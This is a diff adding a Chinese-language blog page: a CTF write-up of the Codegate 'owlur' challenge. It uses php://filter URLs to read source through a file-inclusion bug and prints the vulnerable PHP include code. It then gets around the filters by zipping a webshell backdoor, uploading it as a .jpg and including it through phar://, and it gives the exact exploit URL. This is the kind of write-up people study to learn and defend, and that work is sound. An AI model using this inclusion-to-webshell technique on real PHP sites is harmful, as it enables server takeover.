@@ -1,0 +1,300 @@
+
+<!DOCTYPE html>
+<!--[if IEMobile 7 ]><html class="no-js iem7"><![endif]-->
+<!--[if lt IE 9]><html class="no-js lte-ie8"><![endif]-->
+<!--[if (gt IE 8)|(gt IEMobile 7)|!(IEMobile)|!(IE)]><!--><html class="no-js" lang="en"><!--<![endif]-->
+<head>
+  <meta charset="utf-8">
+  <title>Phpar突破文件包含 - My Octopress Blog</title>
+  <meta name="author" content="Your Name">
+
+  
+  <meta name="description" content="Codegate CTF中owlur的一点解题技巧，通过测试发现网站有文件包含可以通过php://filter读取页面源文件，对php://filter不熟悉的可以研究下： http://x/owlur/index.php?page=php://filter/convert.base64- &hellip;">
+  
+
+  <!-- http://t.co/dKP3o1e -->
+  <meta name="HandheldFriendly" content="True">
+  <meta name="MobileOptimized" content="320">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+  
+  <link rel="canonical" href="http://test.ourren.com/2015/03/16/phpar%E7%AA%81%E7%A0%B4%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/">
+  <link href="/favicon.png" rel="icon">
+  <link href="/stylesheets/screen.css" media="screen, projection" rel="stylesheet" type="text/css">
+  <link href="/atom.xml" rel="alternate" title="My Octopress Blog" type="application/atom+xml">
+  <script src="/javascripts/modernizr-2.0.js"></script>
+  <script src="//ajax.useso.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script>
+  <script>!window.jQuery && document.write(unescape('%3Cscript src="/javascripts/libs/jquery.min.js"%3E%3C/script%3E'))</script>
+  <script src="/javascripts/octopress.js" type="text/javascript"></script>
+  <!--Fonts from Google"s Web font directory at http://google.com/webfonts -->
+<link href="//fonts.useso.com/css?family=PT+Serif:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
+<link href="//fonts.useso.com/css?family=PT+Sans:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
+
+  
+
+</head>
+
+<body   >
+  <header role="banner"><hgroup>
+  <h1><a href="/">My Octopress Blog</a></h1>
+  
+    <h2>A blogging framework for hackers.</h2>
+  
+</hgroup>
+
+</header>
+  <nav role="navigation"><ul class="subscription" data-subscription="rss">
+  <li><a href="/atom.xml" rel="subscribe-rss" title="subscribe via RSS">RSS</a></li>
+  
+</ul>
+  
+<form action="https://www.google.com/search" method="get">
+  <fieldset role="search">
+    <input type="hidden" name="sitesearch" value="test.ourren.com">
+    <input class="search" type="text" name="q" results="0" placeholder="Search"/>
+  </fieldset>
+</form>
+  
+<ul class="main-navigation">
+  <li><a href="/">Blog</a></li>
+  <li><a href="/blog/archives">Archives</a></li>
+</ul>
+
+</nav>
+  <div id="main">
+    <div id="content">
+      <div>
+<article class="hentry" role="article">
+  
+  <header>
+    
+      <h1 class="entry-title">Phpar突破文件包含</h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+<time class='entry-date' datetime='2015-03-16T00:00:00-07:00'><span class='date'><span class='date-month'>Mar</span> <span class='date-day'>16</span><span class='date-suffix'>th</span>, <span class='date-year'>2015</span></span> <span class='time'>12:00 am</span></time>
+        
+      </p>
+    
+  </header>
+
+
+<div class="entry-content"><p>Codegate CTF中owlur的一点解题技巧，通过测试发现网站有文件包含可以通过<a href="http://php.net/manual/zh/wrappers.php.php">php://filter</a>读取页面源文件，对php://filter不熟悉的可以研究下：</p>
+
+<pre><code>http://x/owlur/index.php?page=php://filter/convert.base64-encode/resource=upload
+http://x/owlur/index.php?page=php://filter/string.rot13/resource=ndex
+</code></pre>
+
+
+<p>其中读取后的内容是经过编码了的，要看源码记得解码，比如rot13可以在Linux下：</p>
+
+<pre><code>cat 1.php | rot13
+</code></pre>
+
+
+<p>而通过源码发现网站存在文件包含漏洞，源文件代码如下：</p>
+
+<pre><code><?php
+$p = $_REQUEST['page'];
+
+if($p == "" || $p == "index")
+{
+$p = "main";
+}
+
+$haq = base64_decode("ICAgICAgICAgICAgICAgICAgIC8tLS0tLS0tLS0KICAgICAgICAgICAgICAgICAgLyAvIC8qKioqKipcCiAgICAgICAgICAgICAgICAgLyAvKioqKi0tICogKlwKICAgICAgLy8oKCg6PDw8PC86KioqKioqKioqM1xYKlwoKDwKICAgICAvWFgvQ1hDJkNHRy8vKiovLS0vLy9YKlZcKiouLmcmCigvVkNDM2dnMC4uLi4uLi4uKi8vWC8vKC8vL1YqQ1wqLi44ODhnZzhnJjNDPAooMyZnRyYuLi4uLi4uLi4uLiouLlhYWC8oKCgvKi5cKi4uLi4uLi5HLzA4ODgzWDxgCi8oPEM4IC4uLi4uLi4uLi4uKi5YWFhYLy8vLzwvLi4qLi4uLi4uLi4uLi4uLi4uM0NeClgvLzw8Ly4uLi4uLi4uLi4uKiZDVlgvLy9WLzw8Ly4qLi4uLi4uLi4uLi4uLi4uOEdDPApYWC9DLzo8L1YuLi4uLi4uLiomM0NWWFZYVlgoPFYqKi4uLi4uLi4uLi4uLi4uLiBnOENeCiAgICBHQy88PC8oLi4uLi44RyYzQ0NWWFhYWFZ+WFYqLi4uLi4uLi4uLi4uLi4uIEM4M1YKICAgICAgIFYvPF48KFg4OCZWLy8oKDw8PDwoKDxePCoqLi4uLi4uLi4uLi4uLi4uWCYmQwogICAgICAgICAgICAgIGA6L0NDVi8oKCg8PCgvVlZWLyouLi4uLi4uLi4uLi4uLigvQyYvCiAgICAgICAgICAgICAgIDw8IF5eKC9WMzNWWC9WQyZYKlZDLi4uLjo8PH48PDwoKFggIGAKICAgICAgICAgICAgICAgVi8oLzwgXiBeXjovWC8oKDw8Xl4tLS1WOn5+PDwoCiAgICAgICAgICAgICAgMyYgICAgICAgICAgICAgICAgICAuXi0vCiAgICAgICAgICAgICAgQyAgL1wgICAgICAgL1wgICAgICAgIHwKICAgICAgICAgICAgIC9DICBcLyAgICAgICBcLyAgICAgICAvLwogUExaIFNUT1AgICAgIDMgICAgICAgICAgICAgICAgICAgIHxcCiAgIEhBQ0tJTkcgICAgQyAgICAgICAgICAgICAgICAgICAvNSoKICAgICAgICAgICAgICBWICAgICAvLS0tLS1cICAgICAgIC8KICAgICAgICAgICAgICBDRyAgfCAgICAgICAgIHwgIDwvLy88CiAgICAgICAgICAgICAgVkdWIHwgICAgICAgICB8IF4oL1g8XgogICAgICAgICAgICAgICAmJjwgIFwtLS0tLS8gIC4oKDwoXgogICAgICAgICAgICAgICAgODMoICAgICAgICAuPCh+YDw8CiAgICAgICAgICAgICAgICAgOFhgICAgICAuPDxeYCBgKCheCiAgICAgICAgICAgICAgICBCQEBDPC5gXl5gICAgICBeKENHJkMoPC5gYAogICAgIENHOEIkQEBAQEBAQEBAJCggICAgICAgICAgXl4oMEBAQEAkODNYPGAKICAgQkBAQEBAQEBAQEBAQEBAQEBAOC8gICAgICAgYDxDJEBAQEBAQEBAQEAkJjwKICBAQEBAQEBAQEBAQEBAQEAkJCRAQEAkJDA4ODhCQEBAQEBAQEBAQEBAQEBAQEBWYAogQEBAQEBAQEBAQEBAQEAkQCQkJCQkJCRAQEBAJCRAQEAkQEBAQEBAQEBAQEBAQEBDYApAQEBAQEBAQEBAQEBAQCRAJCQkJCQkJCQkJCQkJCQkJCQkQEBAQEBAQEBAQEBAQEBAKGAKQEBAQEBAQEBAQEAkQCQkJCQkJCQkJCQkJCQkQEAkJEBAQEBAQEBAQEBAQEBAQEBAQEIK");
+$haq = htmlentities($haq);
+
+if(strstr($p,"..") !== FALSE)
+die("<pre>$haq</pre>&#8221;);
+
+if(stristr($p,&#8221;http&#8221;) !== FALSE)
+die(&#8221;<pre>$haq</pre>&#8221;);
+
+if(stristr($p,&#8221;ftp&#8221;) !== FALSE)
+die(&#8221;<pre>$haq</pre>&#8221;);
+
+if(strlen($p) >= 60)
+die(&#8221;<pre>string > 60
+$haq</pre>&#8221;);
+
+$inc = sprintf(&#8220;%s.php&#8221;,$p);
+
+?>
+<?php
+include($inc);
+?>
+</code></pre>
+
+
+<p>可以发现其实page参数可以控制，然后会在后面加一个包含的文件名后面加一个“.php”进行文件包含。</p>
+
+<p>另外而此程序可以上传图片，而上传时只能上传jpg图片，其实程序只检测了后缀是不是jpg结尾的，同时在另存为时程序会自动重命名：随机字符串*6.jpg，也就是说：</p>
+
+<pre><code>xxxx.jpg ---->randon.jpg
+</code></pre>
+
+
+<p>其实他没有检测该上传文件是否合法，所以原始文件可以上传上去的，只不过后缀给改为.jpg了。因此我们可以上传我们需要的文件，但是怎么进行包含，这个确实很考脑力：</p>
+
+<ul>
+    <li>上传的文件不能直接包含，因为直接包含上传文件会变为：xxx.jpg.php，不能解析，并且传递的长度超过60；</li>
+    <li>不存在截断，因为php版本为：5.5.x；</li>
+    <li>远程包含过滤了http,ftp，因此只能考虑其他协议，大家可能首先会想到data://， php://input,很可惜全部失效；</li>
+</ul>
+
+
+<p>查询PHP手册发现PHP支持如下的<a href="http://php.net/manual/en/wrappers.php">Wrappers</a>：</p>
+
+<ul>
+    <li>file:// — Accessing local filesystem</li>
+    <li>http:// — Accessing HTTP(s) URLs</li>
+    <li>ftp:// — Accessing FTP(s) URLs</li>
+    <li>php:// — Accessing various I/O streams</li>
+    <li>zlib:// — Compression Streams</li>
+    <li>data:// — Data (RFC 2397)</li>
+    <li>glob:// — Find pathnames matching pattern</li>
+    <li>phar:// — PHP Archive</li>
+    <li>ssh2:// — Secure Shell 2</li>
+    <li>rar:// — RAR</li>
+    <li>ogg:// — Audio streams</li>
+    <li>expect:// — Process Interaction Streams</li>
+</ul>
+
+
+<p>排除上面的测试结果只能测试其它的，于是开始测试file://（无效），SMB(本地可行，本地环境不行)，ssh2://(不行)，当时测试了很多环境没搞定，暂时就没搞了。「在这里备注下：发现digitalocean开一个临时的VPS来玩比赛挺好的，随时开关也不怎么费钱，还公网IP」；</p>
+
+<p>后来内部有人提测试下phar://，好吧，厚着脸皮再玩下，其实原来在开发yii2的时候有使用composer这个工具，貌似也是phar的后缀，没怎么注意，一查吓一跳，结果phar是php5.3以后引入的，其实就是一个zip打包的文件，这。。。</p>
+
+<p>果断下载一个backdoor，然后压缩为zip，然后修改后缀为.jpg，上传成功并得到目标文件地址，整个过程可以这样子描述：</p>
+
+<pre><code>phpspy.php->x.php->x.zip->x.jpg->upload->xsssa.jpg
+</code></pre>
+
+
+<p>于是构造路径并通过phar://进行访问，你猜怎么着，居然成功了，顺利得到flag：</p>
+
+<p><a href="http://x/owlur/index.php?page=phar:///var/www/owlur/owlur-upload-zzzzzz/O6i51MF.jpg/1">http://x/owlur/index.php?page=phar:///var/www/owlur/owlur-upload-zzzzzz/O6i51MF.jpg/1</a></p>
+
+<p>其中O6i51MF.jpg是一个zip文件，里面有一个1.php的后门。后来听说zip://这样子也可以，so?</p>
+</div>
+
+
+  <footer>
+    <p class="meta">
+      
+  
+
+<span class="byline author vcard">Posted by <span class="fn">Your Name</span></span>
+
+      
+
+
+
+
+<time class='entry-date' datetime='2015-03-16T00:00:00-07:00'><span class='date'><span class='date-month'>Mar</span> <span class='date-day'>16</span><span class='date-suffix'>th</span>, <span class='date-year'>2015</span></span> <span class='time'>12:00 am</span></time>
+      
+
+<span class="categories">
+  
+    <a class='category' href='/categories/security/'>security</a>
+  
+</span>
+
+
+    </p>
+    
+      <div class="sharing">
+  
+  <a href="//twitter.com/share" class="twitter-share-button" data-url="http://test.ourren.com/2015/03/16/phpar%E7%AA%81%E7%A0%B4%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" data-via="" data-counturl="http://test.ourren.com/2015/03/16/phpar%E7%AA%81%E7%A0%B4%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" >Tweet</a>
+  
+  
+  
+</div>
+
+    
+    <p class="meta">
+      
+        <a class="basic-alignment left" href="/2015/03/12/nltk%E7%AC%94%E8%AE%B0%E8%AF%8D%E5%B9%B2%E6%8F%90%E5%8F%96%E4%B8%8E%E8%AF%8D%E6%80%A7%E6%A0%87%E6%B3%A8/" title="Previous Post: NLTK笔记:词干提取与词性标注">&laquo; NLTK笔记:词干提取与词性标注</a>
+      
+      
+    </p>
+  </footer>
+</article>
+
+</div>
+
+<aside class="sidebar">
+  
+    <section>
+  <h1>Recent Posts</h1>
+  <ul id="recent_posts">
+    
+      <li class="post">
+        <a href="/2015/03/16/phpar%E7%AA%81%E7%A0%B4%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/">Phpar突破文件包含</a>
+      </li>
+    
+      <li class="post">
+        <a href="/2015/03/12/nltk%E7%AC%94%E8%AE%B0%E8%AF%8D%E5%B9%B2%E6%8F%90%E5%8F%96%E4%B8%8E%E8%AF%8D%E6%80%A7%E6%A0%87%E6%B3%A8/">NLTK笔记:词干提取与词性标注</a>
+      </li>
+    
+      <li class="post">
+        <a href="/2015/03/10/linux%E4%B8%8Bmysql-udf-%E6%8F%90%E6%9D%83/">Linux下MySQL Udf 提权</a>
+      </li>
+    
+      <li class="post">
+        <a href="/2015/02/21/nltk%E7%AC%94%E8%AE%B0%E5%88%86%E5%8F%A5%E4%B8%8E%E5%88%86%E8%AF%8D/">NLTK笔记:分句与分词</a>
+      </li>
+    
+      <li class="post">
+        <a href="/2015/02/20/youtube%E8%A7%86%E9%A2%91%E4%B8%8B%E8%BD%BD%E6%96%B9%E6%B3%95%E6%B1%87%E6%80%BB/">YouTube视频下载方法汇总</a>
+      </li>
+    
+  </ul>
+</section>
+
+
+
+
+
+  
+</aside>
+
+
+    </div>
+  </div>
+  <footer role="contentinfo"><p>
+  Copyright &copy; 2015 - Your Name -
+  <span class="credit">Powered by <a href="http://octopress.org">Octopress</a></span>
+</p>
+
+</footer>
+  
+
+
+
+
+
+
+
+  <script type="text/javascript">
+    (function(){
+      var twitterWidgets = document.createElement('script');
+      twitterWidgets.type = 'text/javascript';
+      twitterWidgets.async = true;
+      twitterWidgets.src = '//platform.twitter.com/widgets.js';
+      document.getElementsByTagName('head')[0].appendChild(twitterWidgets);
+    })();
+  </script>
+
+
+
+
+
+</body>
+</html>
